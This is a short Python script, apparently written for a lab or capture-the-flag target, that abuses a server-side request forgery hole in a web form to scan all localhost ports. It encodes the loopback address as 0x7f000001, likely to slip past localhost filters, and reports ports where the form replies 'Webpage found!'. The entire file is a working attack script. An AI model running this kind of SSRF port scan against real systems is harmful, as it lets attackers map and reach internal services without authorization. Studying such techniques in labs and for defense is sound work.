#!/usr/bin/env python3
# SSRF vulnerable form localhost port checker
# Use the form feedback to scan and alert to active ports
# Made for one-time-use. It is slightly faster then cURL and ZAP while still painfully slow.

import requests

url = 'http://10.10.20.17:8000/attack?url=http://0x7f000001:'

# function to GET page content
def get_content(u):
    try:
        s = requests.Session()
        r = requests.Request(method='GET', url=u)
        prep = r.prepare()
        prep.url = u
        response = s.send(prep)
        s.close()
        return response.content
    except:
        return 1

# original parameter: /attack?url=http://0x7f000001:5000
# cycle througn all ports 1 - 65535

for p in range(1,65535):
    content=get_content(url+str(p))
    # look for 'Webpage found!'
    if content.find(b'Webpage found!') > -1:
        print('Webpage found! -Port '+str(p))
